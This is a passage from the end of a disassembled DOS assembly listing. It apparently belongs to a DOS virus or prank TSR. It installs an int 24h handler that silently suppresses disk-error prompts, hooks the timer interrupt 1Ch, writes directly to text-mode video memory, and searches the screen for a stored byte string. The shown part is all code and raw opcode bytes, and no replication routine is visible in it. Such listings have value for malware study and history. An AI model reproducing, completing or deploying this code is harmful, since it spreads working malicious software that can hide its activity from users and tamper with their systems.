                                                                ;  set intrpt vector al to ds:dx
                cmp     byte ptr ds:[724h],43h                  ; 'C'
                jne     loc_35                                  ; Jump if not equal
                call    sub_3                                   ; (02AE)
                jmp     short loc_36                            ; (0672)
                db      90h
loc_35:
                call    sub_4                                   ; (0337)
loc_36:
                push    ds
sub_15          endp
  
  
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;
;                       External Entry Point
;
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
  
int_24h_entry   proc    far
                mov     dx,data_33
                mov     ax,data_32
                mov     ds,ax
                mov     ax,2524h
                int     21h                                     ; DOS Services  ah=function 25h
                                                                ;  set intrpt vector al to ds:dx
                pop     ds
                retn
int_24h_entry   endp
  
                db      0B0h, 3, 0CFh
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_16          proc    near
                mov     dx,6B0h
                mov     ax,251Ch
                int     21h                                     ; DOS Services  ah=function 25h
                                                                ;  set intrpt vector al to ds:dx
                mov     byte ptr ds:data_8e,90h
                nop
                mov     ax,0B800h
                mov     es,ax
data_36         db      0BFh
data_37         dw      0FA0h
                db      0B8h, 20h, 7, 0B9h, 0Bh, 0
                db      0F2h, 0ABh, 0Eh, 7, 0C3h, 0
                db      0, 0, 20h, 7, 0Fh
                db      0Ah
data_38         db      0Fh
                db      0Ah
data_39         db      0Fh
                db      0Ah, 0Fh, 0Ah, 0Fh, 0Ah, 0Fh
                db      0Ah, 0Fh, 0Ah, 0Fh, 0Ah, 0F7h
                db      0Eh, 0EEh, 0Ch, 90h, 0FBh, 50h
                db      51h, 52h, 53h, 55h, 56h, 57h
                db      1Eh, 6, 0Eh, 1Fh, 0EBh, 0Bh
                db      90h
loc_37:
                pop     es
                pop     ds
                pop     di
                pop     si
                pop     bp
                pop     bx
                pop     dx
                pop     cx
                pop     ax
                iret                                            ; Interrupt return
sub_16          endp
  
                db      0B8h, 0, 0B8h, 8Eh, 0C0h, 0E8h
                db      2Bh, 0, 0BEh, 9Ah, 6, 0B9h
                db      16h, 0, 0F2h, 0A4h, 80h, 3Eh
                db      0AEh, 6, 0EEh, 74h, 8, 0C6h
                db      6, 0AEh, 6, 0EEh, 0EBh, 6
                db      90h
loc_38:
                mov     data_38,0F0h
loc_39:
                mov     ax,es:[di]
                mov     ah,0Eh
                mov     data_37,ax
                mov     data_36,0
                jmp     short loc_37                            ; (06D0)
  
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
  
sub_17          proc    near
                mov     di,0
loc_40:
                mov     si,69Ch
                push    di
                mov     cx,12h
                cld                                             ; Clear direction
                repe    cmpsb                                   ; Rept zf=1+cx>0 Cmp [si] to es:[di]
                pop     di
                jz      loc_41                                  ; Jump if zero
                inc     di
                inc     di
                cmp     di,0FA0h
                jne     loc_40                                  ; Jump if not equal
                mov     di,0
loc_41:
                cmp     di,0F9Eh
                jne     loc_ret_42                              ; Jump if not equal
                mov     data_39,0CFh
  
loc_ret_42:
                retn
sub_17          endp
  
                db      43h, 0Ch, 0Ah
  
seg_a           ends
  
  
  
                end     start
